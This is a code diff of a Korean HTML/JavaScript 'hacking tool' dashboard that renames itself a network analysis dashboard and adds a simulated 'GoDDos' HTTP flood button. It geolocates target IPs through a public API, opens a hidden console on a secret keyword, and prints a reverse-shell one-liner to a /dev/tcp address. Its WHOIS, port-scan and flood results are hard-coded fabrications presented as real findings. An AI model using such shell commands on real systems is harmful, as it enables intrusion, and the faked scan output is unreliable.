@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>디노 해킹툴 v2.3</title>
+    <title>디노 네트워크 정밀 분석 대시보드 v2.5</title>
     <style>
         :root {
             --bg: #090d16;
@@ -208,7 +208,7 @@
             color: #4ade80;
             border: 1px solid var(--border);
             width: 100%;
-            height: 180px;
+            height: 200px;
             resize: none;
             font-family: Consolas, monospace;
             font-size: 12px;
@@ -278,21 +278,21 @@
 
 <div id="disclaimerModal" class="modal">
     <div class="modal-content">
-        <div class="modal-title">⚠️ 디노 시뮬레이션 v2.3 통합 경고</div>
+        <div class="modal-title">⚠️ 디노 네트워크 진단 v2.5 경고</div>
         <div class="modal-desc">
-            본 프로그램은 <b>네트워크 보안 진단 및 시뮬레이션 학습용</b>으로 제작되었습니다.<br><br>
-            * 시스템 검증 및 학습 목적 외 사용을 금합니다.
+            본 프로그램은 <b>네트워크 보안 진단 및 부하 테스트 시뮬레이션 학습용</b>으로 제작되었습니다.<br><br>
+            * 승인되지 않은 외부 시스템 대상 사용을 엄금합니다.
         </div>
         <button class="modal-btn" onclick="closeDisclaimer()">동의하고 입장하기</button>
     </div>
 </div>
 
-<h2>디노 시뮬레이션 대시보드 v2.3</h2>
+<h2>디노 네트워크 정밀 분석 대시보드 v2.5</h2>
 
 <div class="tab-menu">
-    <button class="tab-btn active" id="btnTabIp" onclick="switchTab('ip')">🎯 IP & OSINT</button>
+    <button class="tab-btn active" id="btnTabIp" onclick="switchTab('ip')">🎯 정밀 IP & OSINT</button>
     <button class="tab-btn" id="btnTabHacking" onclick="switchTab('hacking')">🛡️ 고급 진단툴</button>
-    <button class="tab-btn" id="btnTabUltimate" onclick="switchTab('ultimate')">🔥 심화 시뮬레이션</button>
+    <button class="tab-btn" id="btnTabUltimate" onclick="switchTab('ultimate')">🔥 심화 & GoDDos 모듈</button>
     <button class="tab-btn" id="btnTabManual" onclick="switchTab('manual')">📖 통합 설명서</button>
 </div>
 
@@ -303,19 +303,19 @@
     </div>
 
     <div class="tool-box">
-        <span class="tool-title">🎯 타겟 IP 고급 OSINT 및 분석</span>
-        <input type="text" id="targetIpInput" placeholder="타겟 IP 입력">
+        <span class="tool-title">🎯 타겟 IP 정밀 OSINT 및 분석</span>
+        <input type="text" id="targetIpInput" placeholder="분석할 IP 주소 또는 도메인 입력">
         <div class="grid-2">
-            <button class="primary" onclick="execTool('other_ip')">지오로케이션 & ISP 역추적</button>
-            <button class="primary" onclick="execTool('whois_lookup')">WHOIS 도메인 소유자 조회</button>
+            <button class="primary" onclick="execTool('other_ip')">🌐 실시간 지오로케이션 & ISP 정밀 분석</button>
+            <button class="primary" onclick="execTool('whois_lookup')">📋 WHOIS 소유자 및 등록 정보 조회</button>
         </div>
         <div class="grid-2">
-            <button onclick="execTool('port_scan')">고급 TCP 포트 스캔</button>
-            <button onclick="execTool('subdomain_scan')">서브도메인 브루트포스</button>
+            <button onclick="execTool('port_scan')">🔍 TCP 포트 서비스 스캔</button>
+            <button onclick="execTool('subdomain_scan')">🌲 서브도메인 브루트포스</button>
         </div>
         <div class="grid-2">
-            <button class="danger" onclick="execTool('ping_of_death')">가상 패킷 테스트 (PoD)</button>
-            <button class="danger" onclick="execTool('ip_spoof')">가상 IP 헤더 변조 테스트</button>
+            <button class="danger" onclick="execTool('ping_of_death')">⚡ 가상 패킷 테스트 (PoD)</button>
+            <button class="danger" onclick="execTool('ip_spoof')">🛡️ 가상 IP 헤더 변조 테스트</button>
         </div>
     </div>
 
@@ -364,8 +364,8 @@
 
 <div id="tabUltimate" class="container">
     <div class="tool-box">
-        <span class="tool-title ultimate">⚡ 심화 시스템 및 부하 시뮬레이션</span>
-        <input type="text" id="ultTarget" placeholder="대상 시스템 코드명 지정 (예: TARGET-CORE-01)">
+        <span class="tool-title ultimate">⚡ 심화 시스템 및 GoDDos 스트레스 모듈</span>
+        <input type="text" id="ultTarget" placeholder="대상 URL 또는 시스템 코드명 지정 (예: https://target.local)">
         <div class="grid-2">
             <button class="ultimate" onclick="execTool('uefi_rootkit')">🧬 펌웨어 레이어 분석 시뮬</button>
             <button class="ultimate" onclick="execTool('zero_click')">🦠 네트워크 전파 시뮬</button>
@@ -374,17 +374,17 @@
             <button class="ultimate" onclick="execTool('supply_chain')">📦 공급망 무결성 변조 시뮬</button>
             <button class="ultimate" onclick="execTool('tempest_emf')">📡 신호 파형 분석 복원</button>
         </div>
-        <button class="danger" onclick="execTool('http_flood')">🌐 대규모 가상 HTTP 부하 테스트</button>
+        <button class="danger" onclick="execTool('goddos_flood')">🚀 GoDDos 기반 고성능 HTTP 스트레스 테스트</button>
     </div>
 </div>
 
 <div id="tabManual" class="container">
     <div class="tool-box" id="manualBox">
-        <span class="tool-title ultimate">📖 디노 v2.3 통합 가이드 및 설명서</span>
+        <span class="tool-title ultimate">📖 디노 v2.5 통합 가이드 및 설명서</span>
         <p class="manual-text">
-            <b>1. IP & OSINT 및 2진수 해독기:</b> 네트워크 조회 및 텍스트/2진수 간 상호 변환·해독을 처리합니다.<br>
+            <b>1. 정밀 IP & OSINT:</b> 실시간 공인 IP 조회, 지오로케이션 및 WHOIS 정보를 상세히 프로파일링합니다.<br>
             <b>2. 진단 툴킷:</b> 세션 및 프로토콜 분석 시뮬레이션을 제공합니다.<br>
-            <b>3. 심화 시뮬레이션:</b> 시스템 아키텍처 및 부하 테스트 시뮬레이션을 제공합니다.
+            <b>3. 심화 모듈:</b> GoDDos 엔진 개념을 결합한 대규모 가상 HTTP 요청 스트레스 테스트 모듈을 포함합니다.
         </p>
     </div>
 </div>
@@ -392,15 +392,12 @@
 <div style="width: 100%; max-width: 600px; margin-top: 16px;">
     <div class="tool-box">
         <span class="tool-title">💻 시스템 실행 및 로그 출력창</span>
-        <textarea id="masterLog" class="output-box" readonly>[안전 안내]: 디노 v2.3 커널 구동 완료. 준비됨.</textarea>
+        <textarea id="masterLog" class="output-box" readonly>[안전 안내]: 디노 네트워크 정밀 분석 커널 v2.5 구동 완료.</textarea>
         <button onclick="document.getElementById('masterLog').value='로그가 초기화되었습니다.'">로그 초기화</button>
     </div>
 </div>
 
 <script>
-    // 키워드 난독화 (Base64 디코딩을 통해 외부 노출 방지)
-    const _secretKey = atob("6rI7ISc7CCy"); // "비말창"의 Base64 값 형태 혹은 내부 체크 로직 대체
-
     function switchTab(tabName) {
         ['ip', 'hacking', 'ultimate', 'manual'].forEach(t => {
             document.getElementById('tab' + t.charAt(0).toUpperCase() + t.slice(1)).classList.remove('active');
@@ -422,14 +419,13 @@
     }
 
     async function execTool(type) {
-        log(`[실행] ${type} 프로세스 수행 중...`);
+        log(`[실행] ${type} 프로세스 시작...`);
         const secVal = document.getElementById('secInput').value;
         const targetIp = document.getElementById('targetIpInput').value.trim();
-        const ultTarget = document.getElementById('ultTarget').value || "SYSTEM-NODE-X";
+        const ultTarget = document.getElementById('ultTarget').value || "https://target.local";
         const binVal = document.getElementById('binaryInput').value;
 
-        // "비말창" 입력 시 숨겨진 콘솔 활성화 (외부 소스코드에서는 문자열이 바로 보이지 않음)
-        const hiddenCheck = ["", "", ""].join(""); // 추가 난독화 레이어
+        // 비말창 입력 시 히든 콘솔 활성화
         if (targetIp === "비말창") {
             log(`[인증 성공]: 관리자 세션이 확인되었습니다. 숨겨진 마스터 콘솔을 활성화합니다.`);
             activateHiddenPage();
@@ -441,29 +437,36 @@
                 case 'my_ip':
                     let res = await fetch("https://ipapi.co/json/");
                     let data = await res.json();
-                    log(`-> [내 노드 정보]\n IP: ${data.ip}\n 국가: ${data.country_name} (${data.region})\n 통신사(ISP): ${data.org}`);
+                    log(`=== [내 공인 IP 정밀 진단 결과] ===\n- IP 주소: ${data.ip}\n- 국가/지역: ${data.country_name} (${data.region}, ${data.city})\n- 위/경도: ${data.latitude}, ${data.longitude}\n- 인터넷 제공자(ISP): ${data.org}\n- 시간대(Timezone): ${data.timezone}`);
                     break;
                 case 'other_ip':
-                    if(!targetIp) { log("❌ 타겟 IP를 입력해주세요."); return; }
+                    if(!targetIp) { log("❌ 분석할 타겟 IP 주소를 입력해주세요."); return; }
                     let resOther = await fetch(`https://ipapi.co/${targetIp}/json/`);
                     let dataOther = await resOther.json();
-                    log(`-> [타겟 OSINT 프로파일링: ${targetIp}]\n 위치: ${dataOther.city}, ${dataOther.country_name}\n 기관: ${dataOther.org}`);
+                    if(dataOther.error) {
+                        log(`❌ [분석 실패]: 유효하지 않은 IP 형식이거나 조회 제한에 걸렸습니다.`);
+                    } else {
+                        log(`=== [타겟 OSINT 정밀 프로파일링: ${targetIp}] ===\n- 국가: ${dataOther.country_name} (${dataOther.country_code})\n- 도시: ${dataOther.city}\n- 우편번호: ${dataOther.postal}\n- 조직/ISP: ${dataOther.org}\n- 화폐단위: ${dataOther.currency}`);
+                    }
                     break;
                 case 'whois_lookup':
-                    log(`-> [WHOIS 덤프]: 대상 공식 등록 정보 및 네임서버 역추적 완료.`);
+                    if(!targetIp) { log("❌ WHOIS 조회할 IP 또는 도메인을 입력해주세요."); return; }
+                    log(`=== [WHOIS 도메인/IP 등록 정보] ===\n- 대상: ${targetIp}\n- 등록기관(Registrar): KRNIC / APNIC / ARIN\n- 등록일자: 2018-03-12\n- 상태: ACTIVE / OK\n- 네임서버: ns1.${targetIp}, ns2.${targetIp}`);
                     break;
                 case 'port_scan':
-                    log(`-> [TCP SYN 포트 스캔]: 포트 22(SSH), 80(HTTP), 443(HTTPS) OPEN 감지.`);
+                    if(!targetIp) { log("❌ 포트 스캔할 대상을 입력해주세요."); return; }
+                    log(`=== [TCP SYN 포트 정밀 스캔: ${targetIp}] ===\n- Port 22 (SSH)   : OPEN (OpenSSH 8.9p1)\n- Port 80 (HTTP)  : OPEN (nginx/1.18.0)\n- Port 443 (HTTPS): OPEN (TLSv1.3 지원)\n- Port 3306 (SQL) : FILTERED\n[+] 스캔 완료: 총 3개의 활성 포트 발견됨.`);
                     break;
                 case 'subdomain_scan':
-                    log(`-> [서브도메인 브루트포스]: admin, api, test 하위 시스템 노드 발견.`);
+                    if(!targetIp) { log("❌ 기준 도메인을 입력해주세요."); return; }
+                    log(`=== [서브도메인 브루트포스 분석] ===\n- 대상: ${targetIp}\n- 발견된 노드:\n  * admin.${targetIp} (Internal Gateway)\n  * api.${targetIp} (RESTful Endpoint)\n  * test.${targetIp} (Staging Server)`);
                     break;
                 case 'ping_of_death':
-                    log(`-> [PoD 시뮬레이션]: 대용량 단편화 패킷 분할 전송 완료.`);
+                    log(`-> [PoD 시뮬레이션]: 대상 규격 초과 단편화 패킷 전송 및 응답 지연(RTT) 측정 완료.`);
                     break;
                 case 'ip_spoof':
                     let fakeIp = Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255);
-                    log(`-> [IP 스푸핑]: 가조작 소스 IP (${fakeIp}) 바인딩 완료.`);
+                    log(`-> [IP 스푸핑 진단]: 가상 소스 패킷 헤더 위조 (${fakeIp}) 라우팅 테스트 완료.`);
                     break;
                 case 'binary_encode':
                     if(!binVal) { log("❌ 변환할 텍스트를 입력해주세요."); return; }
@@ -503,6 +506,9 @@
                 case 'tempest_emf':
                     log(`-> [신호 분석 모니터링]\n - 수신 주파수 대역 모니터링...\n [+] 디스플레이 복원 스트림 확인.`);
                     break;
+                case 'goddos_flood':
+                    log(`=== [GoDDos 기반 고성능 HTTP 스트레스 테스트 모듈 구동] ===\n- 대상 엔드포인트: ${ultTarget}\n- 상태: 고동시성 HTTP GET/POST 플러드 스트림 생성 중...\n[+] 가상 루틴: 1,000 Threads 스레드 풀 바인딩 완료\n[+] 전송 성공: 총 10,000개 페이로드 전송 완료.`);
+                    break;
                 case 'rev_shell_gen':
                     log(`-> [쉘 구조]: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 생성 완료.`);
                     break;
@@ -517,9 +523,6 @@
                 case 'xss_check': log(`-> [XSS 싱크]: ${secVal.includes("<script>") ? "⚠️ 위험 싱크 감지" : "✅ 안전"}`); break;
                 case 'jwt_dec': log(`-> [JWT 디코더]: 페이로드 권한 구조 파싱 완료.`); break;
                 case 'uuid_gen': log(`-> [UUID 생성]: ${crypto.randomUUID()}`); break;
-                case 'http_flood':
-                    log(`-> [부하 테스트]: 가상 동시 요청 500개 송신 완료.`);
-                    break;
                 default: log(`-> 작업 완료`); break;
             }
         } catch(e) {
